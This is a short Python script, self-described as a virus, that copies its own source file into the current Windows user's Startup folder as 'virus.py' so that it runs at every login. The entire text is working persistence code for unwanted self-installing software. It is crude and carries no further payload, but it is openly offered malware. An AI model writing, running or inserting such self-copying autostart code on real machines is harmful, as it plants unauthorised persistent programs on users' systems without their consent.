import os

startup = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" % os.getlogin()

print(startup)
print(__file__)


# add this file in startup folder
if os.path.isdir(startup):
    with open(startup + "/virus.py", "w") as f:
        f.write(open(__file__).read())
        
        print("File added to startup folder")
        
        print(startup)
        
else:
    print("Startup folder not found")
